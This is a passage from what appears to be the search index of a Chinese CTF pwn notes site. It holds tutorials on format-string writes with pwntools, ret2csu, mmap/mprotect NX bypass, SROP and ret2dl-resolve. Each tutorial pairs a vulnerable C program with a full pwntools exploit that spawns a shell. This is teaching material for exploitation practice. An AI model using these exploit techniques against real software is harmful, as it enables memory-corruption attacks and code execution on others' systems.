value2}`` numbwritten(int): number of byte already written by the printf function write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n) overflows(int): how many extra overflows (at size sz) to tolerate to reduce the length of the format string strategy(str): either 'fast' or 'small' ('small' is default, 'fast' can be used if there are many writes) Returns: The payload in order to do needed writes Examples: >>> context.clear(arch = 'amd64') >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int') b'%322419390c%4$llnaaaabaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short') b'%47806c%5$lln%22649c%6$hnaaaabaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte') b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> context.clear(arch = 'i386') >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int') b'%322419390c%5$na\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short') b'%4919c%7$hn%42887c%8$hna\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte') b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\\x03\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte') b'%1c%3$na\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: b\"\\xff\\xff\\x04\\x11\\x00\\x00\\x00\\x00\"}, write_size='short') b'%327679c%7$lln%18c%8$hhn\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00' 这里只展示fmtstr_payload使用方法 演示程序(64位) #include #include //gcc -o test test.c -fstack-protector -no-pie -z lazy int main(){ char temp[0x100]; while(1){ puts(\"input:\"); read(0,temp,0x100); printf(temp); } return 0; } 泄露libcbase之后修改puts_got的内容为one_gadget，当然也可以修改printf_got为system，然后temp再输入\"/bin/sh\\x00\"。这里选择前者。 exp from pwn import* context.clear(arch = 'amd64') context.log_level = 'debug' def pr(a,addr): log.success(a+'===>'+hex(addr)) elf = ELF('./test') p = process('./test') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') one_gadget = [0x4f3d5,0x4f432,0x10a41c] puts_got = elf.got['puts'] p.sendafter(':','%41$p') libcbase = int(p.recvuntil('i')[:-1],16) - 231 - libc.sym['__libc_start_main'] one = libcbase + one_gadget[1] pr('libcbase',libcbase) pr('one',one) #---------------------------------------------------------------------------------- payload = fmtstr_payload(6,{puts_got : one},write_size='short').ljust(0x100,'\\x00') print('fmtstr_payload',payload) #gdb.attach(p,'b *'+str(one)) p.sendafter(':',payload) p.interactive() PS！！！ 4.3 version pwntools更新了这个模块 如果地址中有'\\x00'会遇到printf的截断 更新之后地址加在了后边 Help on function fmtstr_payload in module pwnlib.fmtstr: fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy='small', badbytes=frozenset([]), offset_bytes=0) fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from ``context.bits`` The overflows argument is a format-string-length to output-amount tradeoff: Larger values for ``overflows`` produce shorter format strings that generate more output at runtime. Arguments: offset(int): the first formatter's offset you control writes(dict): dict with addr, value ``{addr: value, addr2: value2}`` numbwritten(int): number of byte already written by the printf function write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n) overflows(int): how many extra overflows (at size sz) to tolerate to reduce the length of the format string strategy(str): either 'fast' or 'small' ('small' is default, 'fast' can be used if there are many writes) Returns: The payload in order to do needed writes Examples: >>> context.clear(arch = 'amd64') >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int') b'%322419390c%4$llnaaaabaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short') b'%47806c%5$lln%22649c%6$hnaaaabaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte') b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> context.clear(arch = 'i386') >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int') b'%322419390c%5$na\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short') b'%4919c%7$hn%42887c%8$hna\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte') b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\\x03\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte') b'%1c%3$na\\x00\\x00\\x00\\x00' >>> fmtstr_payload(1, {0x0: b\"\\xff\\xff\\x04\\x11\\x00\\x00\\x00\\x00\"}, write_size='short') b'%327679c%7$lln%18c%8$hhn\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00' "},"pwn/fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html":{"url":"pwn/fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html","title":"格式化字符串中的占位符特殊用法","keywords":"","body":"*号的用法 *在printf里可以代表一个泛整数，可以代表任何整数。它可以出现在位宽的位置，也可以出现在小数位数的位置。 对于下面这个程序 #include int main(){ float a = 3.14; printf(\"num:%*.2f\",6,a); } 它的输出是 num: 3.14 也就是%*.2f这个格式化参数在输出时一共占了6个字符大小。 那么下面给出一道例题 //gcc -o test test.c -no-pie -g #include #include #include #include long long num=0; int main(){ char buf[0x18]; long long a=0; long long b=0; int fp = open(\"/dev/urandom\",O_RDONLY); read(fp,&a,2); read(fp,&b,2); close(fp); puts(\"your name:\"); read(0,buf,0x18); puts(\"guess a number:\"); scanf(\"%lld\",&num); printf(buf); if(a+b==num){ puts(\"win!\"); system(\"/bin/sh\"); }else{ puts(\"wrong!\"); exit(0); } } 不考虑爆破的情况，这里虽然可以通过格式化字符串泄露这两个值，但是这里只能先猜，所以这里用*来修改内存，先输出a、b两个数的宽度再用%n写入num，达到num=a+b的效果。 栈上情况 exp from pwn import* p = process('./test') num_addr = 0x601078 payload = '%*8$c%*9$c%12$n'.ljust(0x10,'a')+p64(num_addr) p.sendafter('\\n',payload) p.sendlineafter('\\n','0') p.interactive() "},"pwn/rop/":{"url":"pwn/rop/","title":"rop","keywords":"","body":""},"pwn/rop/ret2csu/ret2csu.html":{"url":"pwn/rop/ret2csu/ret2csu.html","title":"ret2csu","keywords":"","body":"//gcc -o ret2csu -no-pie -z lazy -fno-stack-protector ret2csu.c #include #include void init() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } void vuln(){ char buf[0x20]; write(1,\"hello!\",6); read(0,buf,0x100); return; } int main(){ vuln(); return 0; } exp from pwn import* context.arch = 'amd64' context.log_level = 'debug' def pr(a,addr): log.success(a+'====>'+hex(addr)) def csu(arg1,arg2,arg3,func,retfun): mmmc = 0x400730 pop6_ret = 0x40074a payload = p64(pop6_ret) payload += p64(0)+p64(1)+p64(func)+p64(arg1)+p64(arg2)+p64(arg3) payload += p64(mmmc)+'a'*56 payload += p64(retfun) return payload p = process('./ret2csu') elf = ELF('./ret2csu') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') write_plt = elf.plt['write'] write_got = elf.got['write'] vuln = 0x400698 prdi = 0x400753 payload = 'a'*0x28+csu(1,write_got,8,write_got,vuln) p.sendafter('!',payload) libcbase = u64(p.recv(8)) - libc.sym['write'] system = libcbase + libc.sym['system'] sh = libcbase + libc.search('/bin/sh').next() ogg = libcbase + [0x4f3d5,0x4f432,0x10a41c][1] pr('libcbase',libcbase) pr('system',system) pr('sh',sh) #gdb.attach(p,'b *0x00000000004006cd') payload = '\\x00'*0x28+p64(ogg) p.sendafter('!',payload.ljust(0x100,'\\x00')) p.interactive() "},"pwn/rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html":{"url":"pwn/rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html","title":"通过mmap&mprotect来绕过nx","keywords":"","body":"mmap mmap函数的用法 mmap将一个文档或者其它对象映射进内存。文档被映射到多个页上，如果文档的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。 头文档 void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset); 第一个参数：分配新内存的地址 第二个参数：新内存的长度（0x1000的倍数），长度单位是字节，不足一内存页按一内存页处理 第三个参数：期望的内存保护标志，不能与文档的打开模式冲突。 PROT_EXEC（可执行）在内存中用4来表示 PROT_READ（可读）在内存中用1来表示 PROT_WRITE（可写）在内存中用2来表示 PROT_NONE（不可访问）在内存中用0来表示 第四个参数：映射的类型 MAP_FIXED（）在内存中用10来表示 MAP_SHARED（）在内存中用1来表示 MAP_PRIVATE（）在内存中用2来表示 MAP_NORESERVE（）在内存中用4000来表示 MAP_LOCKED（）在内存中用2000来表示 第五个参数：文档描述符，可设为0 第六个参数：如果为文档映射，则此处代表定位到文档的那个位置，然后开始向后映射。 函数返回值： 若该函数执行成功，mmap()返回被映射区的指针，失败时返回MAP_FAILED（-1） 在nx保护开启的情况下，我们依然可以通过mmap来申请出一段有读写执行权限的内存，通常mmap(target_addr,0x1000,7,34,0,0)，这里target_addr需要页对齐也就是0x1000的整数倍，若不对齐，申请到的起始地址将不是target_addr。 写个简单的程序验证一下，可以看到申请到的内存具有rwx权限，并且函数返回值为mmap到的内存的起始地址。 #include #include int main(){ void *addr; addr = 0xdead1000; mmap(addr,0x1000,7,34,0,0); return 0; } 通过一道例题再操练一下 https://github.com/gloxec/record/blob/master/ssctf_2017/pwn250 基本信息：静态链接、32位、nx开启 print中memcpy导致栈溢出 思路：调用mmap申请一块有rwx权限的内存，往里面写shellcode，最终返回到shellcode上 exp from pwn import* context.log_level = 'debug' context.binary = './pwn250' p = process('./pwn250') elf = ELF('./pwn250') mmap_addr = elf.sym['mmap'] main_addr = elf.sym['main'] read_addr = elf.sym['read'] newaddr=0xbeef1000 p.sendlineafter(']',str(0x100)) payload = 'a'*(58+4)+p32(mmap_addr)+p32(main_addr)+p32(newaddr)+p32(1024)+p32(7)+p32(34)+p32(0)+p32(0) p.sendafter(']',payload) p.sendlineafter(']',str(0x100)) payload = 'a'*(58+4)+p32(read_addr)+p32(newaddr)+p32(0)+p32(newaddr)+p32(0x100) p.sendafter(']',payload) #gdb.attach(p,'b print') shellcode = asm(shellcraft.sh()) p.sendline(shellcode) p.interactive() mprotect 函数原型 #include int mprotect(void *addr, size_t len, int prot) mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。 第一个参数：开始地址（该地址应是0x1000的倍数，以页方式对齐） 第二个参数：指定长度（长度也应该是0x1000的倍数） 第三个参数：指定属性 如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个： 1）EACCES 该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。 2）EINVAL start 不是一个有效的指针，指向的不是某个内存页的开头。 3）ENOMEM 内核内部的结构体无法分配。 4）ENOMEM 进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。 如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程。 写个简单的程序验证一下，可以看到的原本不是rwx权限的页具有了rwx权限 #include #include int main(){ void *addr; addr = 0x00400000; mprotect(addr,0x1000,7); return 0; } 下面用mprotect来做刚刚那道题目 思路，把bss段的权限用mprotect改为rwx，把shellcode写到bss段上再返回到shellocde上。 from pwn import* context.log_level = 'debug' context.binary = './pwn250' p = process('./pwn250') elf = ELF('./pwn250') mprotect_addr = elf.sym['mprotect'] main_addr = elf.sym['main'] read_addr = elf.sym['read'] bss_addr = 0x080ec000 p.sendlineafter(']',str(0x100)) payload = 'a'*(58+4)+p32(mprotect_addr)+p32(main_addr)+p32(bss_addr)+p32(0x1000)+p32(7) p.sendafter(']',payload) p.sendlineafter(']',str(0x100)) payload = 'a'*(58+4)+p32(read_addr)+p32(bss_addr)+p32(0)+p32(bss_addr)+p32(0x100) p.sendafter(']',payload) #gdb.attach(p,'b print') shellcode = asm(shellcraft.sh()) p.sendline(shellcode) p.interactive() 再穿插一道例题jarvisoj level5 动态链接，64位栈溢出，题目描述是不能执行system或execve，那么我们用mprotect来做 exp from pwn import* context.log_level = 'debug' context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def csu_payload(got_addr,arg1,arg2,arg3,ret_addr): payload = 'a'*0x88 payload += p64(0x4006AA) payload += p64(0)+p64(1)+p64(got_addr)+p64(arg3)+p64(arg2)+p64(arg1) payload += p64(0x400690)+'a'*56 + p64(ret_addr) return payload def ropchain(target,arg1,arg2,arg3,ret_addr): payload = 'a'*0x88 payload +=p64(prdi_ret)+p64(arg1) payload +=p64(prsi_ret)+p64(arg2) payload +=p64(prdx_ret)+p64(arg3) payload +=p64(target)+p64(ret_addr) return payload p =process('./level3_x64') elf = ELF('./level3_x64') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') prdi_ret = 0x4006B3 prsi_ret = 0x23eea prdx_ret = 0x1b96 write_got = elf.got['write'] write_plt = elf.plt['write'] read_got = elf.got['read'] vuln = elf.sym['vulnerable_function'] bss = 0x600000+0xb00 payload = csu_payload(write_got,1,write_got,8,vuln) p.sendafter('Input:\\n',payload) libcbase = u64(p.recv(8)) - libc.sym['write'] mprotect = libcbase + libc.sym['mprotect'] prsi_ret += libcbase prdx_ret += libcbase pr('libcbase',libcbase) #gdb.attach(p,'b *0x400618') payload = ropchain(mprotect,0x600000,0x1000,7,vuln) p.sendafter('Input:\\n',payload) payload = csu_payload(read_got,0,bss,0x200,bss) p.sendafter('Input:\\n',payload) shellcode = asm(shellcraft.sh()) p.send(shellcode) p.interactive() 本来想用mmap试试，发现r9相关的rop有点难利用也懒得试了，老懒狗了。 参考文章 https://www.dazhuanlan.com/2019/12/05/5de804217ca51/ https://blog.csdn.net/roland_sun/article/details/33728955 "},"pwn/rop/srop/srop.html":{"url":"pwn/rop/srop/srop.html","title":"srop","keywords":"","body":"SROP本质是 sigreturn 这个系统调用，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。 对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext 。 x86 struct sigcontext { unsigned short gs, __gsh; unsigned short fs, __fsh; unsigned short es, __esh; unsigned short ds, __dsh; unsigned long edi; unsigned long esi; unsigned long ebp; unsigned long esp; unsigned long ebx; unsigned long edx; unsigned long ecx; unsigned long eax; unsigned long trapno; unsigned long err; unsigned long eip; unsigned short cs, __csh; unsigned long eflags; unsigned long esp_at_signal; unsigned short ss, __ssh; struct _fpstate * fpstate; unsigned long oldmask; unsigned long cr2; }; x64 struct _fpstate { /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd; __uint16_t swd; __uint16_t ftw; __uint16_t fop; __uint64_t rip; __uint64_t rdp; __uint32_t mxcsr; __uint32_t mxcr_mask; struct _fpxreg _st[8]; struct _xmmreg _xmm[16]; __uint32_t padding[24]; }; struct sigcontext { __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union { struct _fpstate * fpstate; __uint64_t __fpstate_word; }; __uint64_t __reserved1 [8]; }; signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。 攻击思路（以64位为例） 当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。 system call chains 这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。 vsyscall中的syscall；ret片段（地址不受alsr影响） 例题1：Backdoor CTF 2017-funsignals（程序本身存在sigreturn片段） 直接写入 Signal Frame 即可（先往bss段上写入'/bin/sh'） exp: from pwn import* context.update(os = 'linux', arch = 'amd64') context.log_level= 'debug' p = process('./funsignals') #gdb.attach(p,'b *0x1000000B') syscall_addr = 0x1000000B new_stack_addr = 0x10000000+0x500 sh_addr = new_stack_addr+0x100 frameExecve = SigreturnFrame() frameExecve.rax = 0 frameExecve.rdi = 0 frameExecve.rsi = new_stack_addr frameExecve.rdx = 0x200 frameExecve.rip = syscall_addr frameExecve.rsp = new_stack_addr payload = str(frameExecve) p.send(payload) frameExecve = SigreturnFrame() frameExecve.rax = constants.SYS_execve frameExecve.rdi = sh_addr frameExecve.rsi = 0 frameExecve.rdx = 0 frameExecve.rip = syscall_addr payload = str(frameExecve).ljust(0x100,'\\x00')+'/bin/sh\\x00' sleep(1) p.send(payload) p.interactive() 例题2：hgame2021 week4 rop_senior（需要通过read函数的返值来控制rax进而实现sigreturn） 漏洞函数及其汇编 思路：先往栈上写入一个Signal Frame（实现往bss段上写入数据），通过read实现控制rax进而实现sigreturn，后续思路与之前一直，不过是Signal Frame变成实现execve(\"/bin/sh\",0,0)。 exp： from pwn import* context.log_level = 'debug' context.update(os = 'linux', arch = 'amd64') p = process('./rop_senior') read_addr = 0x40063A syscall_addr = 0x400647 vuln = 0x40062A new_stack_addr = 0x601000 + 0x500 sh_addr = new_stack_addr+0x120 #gdb.attach(p,'b *0x40064A') frameExecve = SigreturnFrame() frameExecve.rax = constants.SYS_read frameExecve.rdi = 0 frameExecve.rsi = new_stack_addr frameExecve.rdx = 0x400 frameExecve.rip = syscall_addr frameExecve.rsp = new_stack_addr payload = p64(0)+p64(read_addr)+p64(syscall_addr)+'\\x00'*8+str(frameExecve) p.sendafter('best',payload) sleep(1) #pause() payload = p64(0)+p32(syscall_addr) payload = payload.ljust(15,'\\x00') p.send(payload) sleep(1) #pause() frameExecve = SigreturnFrame() frameExecve.rax = constants.SYS_execve frameExecve.rdi = sh_addr frameExecve.rsi = 0 frameExecve.rdx = 0 frameExecve.rip = syscall_addr payload = p64(0)+p64(read_addr)+p64(syscall_addr)+'\\x00'*8+str(frameExecve).ljust(0x100,'\\x00')+'/bin/sh\\x00' p.send(payload) sleep(1) #pause() payload = p64(0)+p32(syscall_addr) payload = payload.ljust(15,'\\x00') p.send(payload) p.interactive() "},"pwn/rop/dl_runtime_resolve/dl_runtime_resolve.html":{"url":"pwn/rop/dl_runtime_resolve/dl_runtime_resolve.html","title":"dl_runtime_resolve","keywords":"","body":"穿插例题XDCTF2015 bof ELF程序的基本相关结构 dynmic段 dynmic 段里面保存了动态链接器所需要的基本信息。比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。 相关结构体 typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un; } Elf32_Dyn; extern Elf32_Dyn_DYNAMIC[]; readelf -d elf查看 Elf32_Dyn结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。下面给出和延迟绑定相关的类型值的定义。 节区中包含目标文件的所有信息。节的相关结构体。 typedef struct { Elf32_Word sh_name; /* Section name (string tbl index) 节区头部字符串节区的索引*/ Elf32_Word sh_type; /* Section type 节区类型*/ Elf32_Word sh_flags; /* Section flags 节区标志，用于描述属性*/ Elf32_Addr sh_addr; /* Section virtual addr at execution节区的内存映像 */ Elf32_Off sh_offset; /* Section file offset 节区的文件偏移*/ Elf32_Word sh_size; /* Section size in bytes 节区的长度*/ Elf32_Word sh_link; /* Link to another section 节区头部表索引链接*/ Elf32_Word sh_info; /* Additional section information 附加信息*/ Elf32_Word sh_addralign; /* Section alignment 节区对齐约束*/ Elf32_Word sh_entsize; /* Entry size if section holds table 固定大小的节区表项的长度*/ } Elf32_Shdr; readelf -S elf查看elf程序的节区 .rel.plt节、.rel.dyn节与.got节、.got.plt节的关系 .rel.plt节用于函数重定位，.rel.dyn节用于变量重定位 相关的结构体 typedef struct { Elf32_Addr r_offset; // 对于可执行文件，此值为虚拟地址 Elf32_Word r_info; // 符号表索引 } Elf32_Rel; #define ELF32_R_SYM(val) ((val) >> 8) #define ELF32_R_TYPE(val) ((val) & 0xff) #define ELF32_R_INFO(sym, type) (((sym) readelf -r elf查看rel相关节内容 r_offset即相应变量/函数got表的地址（指向.got节/.got.plt节中的某一项） 即 .got节保存全局变量偏移表，.got.plt节保存全局函数偏移表。.got.plt对应着Elf32_Rel结构中r_offset的值。 .dynsym节 .dynsym节相关结构体 typedef struct { Elf32_Word st_name; // Symbol name(string tbl index) Elf32_Addr st_value; // Symbol value Elf32_Word st_size; // Symbol size unsigned char st_info; // Symbol type and binding unsigned char st_other; // Symbol visibility under glibc>=2.2 Elf32_Section st_shndx; // Section index } Elf32_Sym; readelf -s elf查看 .dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel->r_info) 根据宏定义 #define ELF32_R_SYM(val) ((val) >> 8) 可以知道 ELF32_R_SYM(Elf32_Rel->r_info) = (Elf32_Rel->r_info) >> 8 例如write的索引值为 ELF32_R_SYM(0x607) = 0x607 >> 8 = 6。而Elf32_Sym[6]即保存着write的符号表信息。并且ELF32_R_TYPE(0x607) = 7，对应R_386_JUMP_SLOT。 .dynstr节 .dynstr节包含了动态链接的字符串。这个节以\\x00作为开始和结尾，中间每个字符串也以\\x00间隔。 通过Elf32_Sym->st_name来确定相应函数字符串的位置 字符串地址 = .dynstr节起始地址 + Elf32_Sym[(Elf32_Rel->r_info) >> 8]->st_name .plt节 .plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。 动态链接过程 程序第一次执行write函数时的过程 jmp 0x8048470即.plt节的起始位置（压入linkmap执行_dl_runtime_resolve） [_GLOBAL_OFFSET_TABLE_+4]中是linkmap的地址 [_GLOBAL_OFFSET_TABLE_+8]中是_dl_runtime_resolve函数入口地址 以上指令相当于执行了_dl_runtime_resolve(link_map, reloc_arg)，该函数会完成符号的解析，即将真实的write函数地址写入其GOT条目中，随后把控制权交给write函数。 （其中reloc_arg即一开始的push 0x20） _dl_fixup是在glibc-2.23/elf/dl-runtime.c实现的，我们只关注一些主要函数。 _dl_fixup(struct link_map *l, ElfW(Word) reloc_arg) { // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); // 然后通过reloc->r_info找到.dynsym中对应的条目 const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)]; // 这里还会检查reloc->r_info的最低位是不是R_386_JUMP_SLOT=7 assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT); // 接着通过strtab+sym->st_name找到符号表字符串，result为libc基地址 result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); // value为libc基址加上要解析函数的偏移地址，也即实际地址 value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0); // 最后把value写入相应的GOT表条目中 return elf_machine_fixup_plt (l, result, reloc, rel_addr, value); } 符号解析过程 ELF_rel_addr = .rel.plt节起始地址 + reloc_index ELF_sym_addr = .dynsym节起始地址 + sizeof(ELF_sym) * (r_info>>8) str_addr = .dynstr节起始地址 + st_name 32位下利用方式 1.控制eip为PLT[0]的地址，只需传递一个index_arg参数 2.控制index_arg的大小，使reloc的位置落在可控地址内 3.伪造reloc的内容，使sym落在可控地址内 4.伪造sym的内容，使name落在可控地址内 5.伪造name为任意库函数，如system 漏洞程序源码 bof.c #include #include #include void vuln() { char buf[100]; setbuf(stdin, buf); read(0, buf, 256); } int main() { char buf[100] = \"Welcome to XDCTF2015~!\\n\"; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0; } exp: from pwn import* context.log_level = 'debug' p = process('./bof') elf = ELF('./bof') base_stage = 0x804a800 p3_ret = 0x804856c leave_ret = 0x8048481 pebp_ret = 0x8048453 payload1 = 'a'*112+p32(elf.plt['read'])+p32(p3_ret)+p32(0)+p32(base_stage)+p32(0x200) payload1 += p32(pebp_ret)+p32(base_stage)+p32(leave_ret) fake_rel_addr = base_stage+0x50 fake_sym_addr = base_stage + 0x68 system_str = base_stage + 0x80 sh = base_stage+0x90 plt_start = elf.get_section_by_name('.plt').header.sh_addr rel_plt0 = elf.get_section_by_name('.rel.plt').header.sh_addr dynsym0 = elf.get_section_by_name('.dynsym').header.sh_addr dynstr0 = elf.get_section_by_name('.dynstr').header.sh_addr rel_offset = fake_rel_addr - rel_plt0 r_info = ((fake_sym_addr - dynsym0)/0x10) 参考链接： http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ https://ray-cp.github.io/archivers/ret2dl_resolve_analysis "},"pwn/rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html":{"url":"pwn/rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html","title":"dl_runtime_resolve_64位","keywords":"","body":"先把相关结构体和宏都列一下把（也懒得一个一个解释了） typedef struct { Elf64_Sxword d_tag; /* Dynamic entry type */ union { Elf64_Xword d_val; /* Integer value */ Elf64_Addr d_ptr; /* Address value */ } d_un; } Elf64_Dyn; typedef struct { Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ } Elf64_Sym; typedef struct { Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ } Elf64_Rel; typedef struct { Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ Elf64_Sxword r_addend; /* Addend */ } Elf64_Rela; #define ELF64_R_SYM(i) ((i) >> 32) #define ELF64_R_TYPE(i) ((i) & 0xffffffff) #define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) struct link_map { Elf64_Addr l_addr; char *l_name; Elf64_Dyn *l_ld; struct link_map *l_next; struct link_map *l_prev; struct link_map *l_real; Lmid_t l_ns; struct libname_list *l_libname; Elf64_Dyn *l_info[76]; const Elf64_Phdr *l_phdr; Elf64_Addr l_entry; Elf64_Half l_phnum; Elf64_Half l_ldnum; struct r_scope_elem l_searchlist; struct r_scope_elem l_symbolic_searchlist; struct link_map *l_loader; struct r_found_version *l_versions; unsigned int l_nversions; Elf_Symndx l_nbuckets; Elf32_Word l_gnu_bitmask_idxbits; Elf32_Word l_gnu_shift; const Elf64_Addr *l_gnu_bitmask; union { const Elf32_Word *l_gnu_buckets; const Elf_Symndx *l_chain; }; union { const Elf32_Word *l_gnu_chain_zero; const Elf_Symndx *l_buckets; }; unsigned int l_direct_opencount; enum {lt_executable, lt_library, lt_loaded} l_type : 2; unsigned int l_relocated : 1; unsigned int l_init_called : 1; unsigned int l_global : 1; unsigned int l_reserved : 2; unsigned int l_phdr_allocated : 1; unsigned int l_soname_added : 1; unsigned int l_faked : 1; unsigned int l_need_tls_init : 1; unsigned int l_auditing : 1; unsigned int l_audit_any_plt : 1; unsigned int l_removed : 1; unsigned int l_contiguous : 1; unsigned int l_symbolic_in_local_scope : 1; unsigned int l_free_initfini : 1; struct r_search_path_struct l_rpath_dirs; struct reloc_result *l_reloc_result; Elf64_Versym *l_versyms; const char *l_origin; Elf64_Addr l_map_start; Elf64_Addr l_map_end; Elf64_Addr l_text_end; struct r_scope_elem *l_scope_mem[4]; size_t l_scope_max; struct r_scope_elem **l_scope; struct r_scope_elem *l_local_scope[2]; struct r_file_id l_file_id; struct r_search_path_struct l_runpath_dirs; struct link_map **l_initfini; struct link_map_reldeps *l_reldeps; unsigned int l_reldepsmax; unsigned int l_used; Elf64_Word l_feature_1; Elf64_Word 